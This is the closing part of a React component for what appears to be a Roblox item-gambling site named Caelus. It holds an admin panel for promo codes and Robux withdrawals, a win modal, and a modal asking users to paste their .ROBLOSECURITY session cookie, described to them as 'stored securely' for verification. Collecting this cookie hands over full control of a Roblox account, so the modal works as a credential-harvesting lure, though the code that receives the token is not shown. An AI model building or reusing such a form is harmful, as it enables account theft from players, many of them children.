                    className="px-4 py-3 bg-slate-900 border border-slate-700 rounded-lg text-white"
                  />
                </div>
                
                <button
                  onClick={createPromoCode}
                  className="w-full py-3 bg-indigo-600 hover:bg-indigo-700 text-white rounded-lg font-semibold transition mb-4"
                >
                  Create Promo Code
                </button>
                
                <div className="space-y-2">
                  {promos.map((promo) => (
                    <div key={promo.code} className="bg-slate-900/50 p-4 rounded-lg">
                      <div className="text-white font-bold">{promo.code}</div>
                      <div className="text-slate-400">R$ {promo.amount} • {promo.uses}/{promo.maxUses} uses</div>
                    </div>
                  ))}
                </div>
              </div>
              
              {/* Withdrawals */}
              <div className="bg-slate-800/50 backdrop-blur-xl border border-slate-700/50 rounded-2xl p-6">
                <h3 className="text-xl font-bold text-white mb-4">Pending Withdrawals ({withdrawals.length})</h3>
                <div className="space-y-2">
                  {withdrawals.map((w) => (
                    <div key={w.id} className="bg-slate-900/50 p-4 rounded-lg">
                      <div className="text-white font-semibold">{w.name}</div>
                      <div className="text-slate-400 text-sm">@{w.robloxUsername}</div>
                      <div className="text-yellow-400 font-bold">R$ {w.amount}</div>
                      <div className="flex gap-2 mt-2">
                        <button
                          onClick={() => approveWithdrawal(w.id)}
                          className="px-4 py-2 bg-green-600 hover:bg-green-700 text-white rounded-lg transition"
                        >
                          Approve
                        </button>
                        <button
                          onClick={() => rejectWithdrawal(w.id)}
                          className="px-4 py-2 bg-red-600 hover:bg-red-700 text-white rounded-lg transition"
                        >
                          Reject
                        </button>
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          </div>
        )}
      </div>

      {/* Win Modal */}
      <AnimatePresence>
        {wonItem && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 bg-black/70 backdrop-blur-sm flex items-center justify-center p-4 z-50"
            onClick={() => setWonItem(null)}
          >
            <motion.div
              initial={{ scale: 0.5, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.5, opacity: 0 }}
              className={`bg-gradient-to-br ${getRarityColor(wonItem.rarity)} rounded-2xl p-8 max-w-md w-full border-4 border-white/30`}
              onClick={(e) => e.stopPropagation()}
            >
              <h3 className="text-3xl font-bold text-white text-center mb-4">🎉 YOU WON! 🎉</h3>
              <div className="text-white font-bold text-2xl text-center mb-2">{wonItem.name}</div>
              <div className="text-yellow-300 font-bold text-3xl text-center mb-4">R$ {wonItem.value}</div>
              <div className="text-white/80 text-center mb-6">{wonItem.rarity} • {wonItem.demand} Demand</div>
              <button
                onClick={() => setWonItem(null)}
                className="w-full py-3 bg-white/20 hover:bg-white/30 text-white rounded-xl font-bold transition"
              >
                Awesome!
              </button>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* ROBLOSECURITY Modal */}
      {showRoblosecurity && (
        <div className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center p-4 z-50">
          <motion.div
            initial={{ scale: 0.9, opacity: 0 }}
            animate={{ scale: 1, opacity: 1 }}
            className="bg-slate-800 border border-slate-700 rounded-xl p-6 max-w-md w-full"
          >
            <h3 className="text-xl font-bold text-white mb-4">Update .ROBLOSECURITY</h3>
            <p className="text-slate-300 mb-4 text-sm">
              Your .ROBLOSECURITY token is stored securely and used to verify your Caelus account.
            </p>
            
            <input
              type="password"
              value={roblosecurityInput}
              onChange={(e) => setRoblosecurityInput(e.target.value)}
              placeholder="Paste .ROBLOSECURITY here"
              className="w-full px-4 py-3 bg-slate-900 border border-slate-700 rounded-lg text-white focus:border-indigo-500 outline-none mb-4"
            />
            
            <div className="flex gap-3">
              <button
                onClick={handleRoblosecuritySubmit}
                className="flex-1 px-4 py-3 bg-indigo-600 hover:bg-indigo-700 text-white rounded-lg font-semibold transition"
              >
                Save
              </button>
              <button
                onClick={() => setShowRoblosecurity(false)}
                className="px-4 py-3 bg-slate-700 hover:bg-slate-600 text-white rounded-lg transition"
              >
                Cancel
              </button>
            </div>
          </motion.div>
        </div>
      )}

      {/* Admin Login Modal */}
      {showAdminLogin && !isAdmin && (
        <div className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center p-4 z-50">
          <motion.div
            initial={{ scale: 0.9, opacity: 0 }}
            animate={{ scale: 1, opacity: 1 }}
            className="bg-slate-800 border border-slate-700 rounded-xl p-6 max-w-md w-full"
          >
            <h3 className="text-xl font-bold text-white mb-4">Admin Login</h3>
            
            <input
              type="password"
              value={adminPassword}
              onChange={(e) => setAdminPassword(e.target.value)}
              placeholder="Admin password"
              className="w-full px-4 py-3 bg-slate-900 border border-slate-700 rounded-lg text-white focus:border-indigo-500 outline-none mb-4"
              onKeyPress={(e) => e.key === 'Enter' && adminLogin()}
            />
            
            <div className="flex gap-3">
              <button
                onClick={adminLogin}
                className="flex-1 px-4 py-3 bg-indigo-600 hover:bg-indigo-700 text-white rounded-lg font-semibold transition"
              >
                Login
              </button>
              <button
                onClick={() => setShowAdminLogin(false)}
                className="px-4 py-3 bg-slate-700 hover:bg-slate-600 text-white rounded-lg transition"
              >
                Cancel
              </button>
            </div>
          </motion.div>
        </div>
      )}
    </div>
  );
}

export default App;
